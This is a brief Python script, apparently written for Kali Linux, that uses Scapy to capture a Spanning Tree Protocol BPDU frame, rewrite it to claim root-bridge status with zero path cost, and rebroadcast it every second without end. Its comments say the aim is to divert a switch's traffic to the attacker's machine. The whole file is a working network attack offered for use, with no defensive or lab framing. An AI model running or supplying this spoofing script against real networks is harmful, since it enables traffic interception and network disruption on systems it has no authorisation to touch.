from scapy.all import *

# Capture Spanning Tree frame from your accessible Switch to your Kali
# Spanning Tree Protocol MAC addr = 01:80:c2:00:00:00
pkt = sniff(filter="ether dst 01:80:c2:00:00:00")

# Block our accessible Switch to its Root Switch (master switch)
# By making our accessible Switch think that it'd be better off routing
# traffic to our Kali, cuz the pathcost is much lower for our accessible switch
# to route traffic to its Root Switch
pkt[0].pathcost = 0

# Set Bridge MAC to Root MAC
pkt[0].bridgemac = pkt[0].rootmac

# Set port ID to 1
pkt[0].portid = 1

# Loop to send multiple BPDUs
while True:
    # Showing captured packets from our accessible Switch
    pkt[0].show()
    # Send our falsified packets to the network
    sendp(pkt[0], loop=0, verbose=1)
    # Wait for 1 sec before sending again
    time.sleep(1)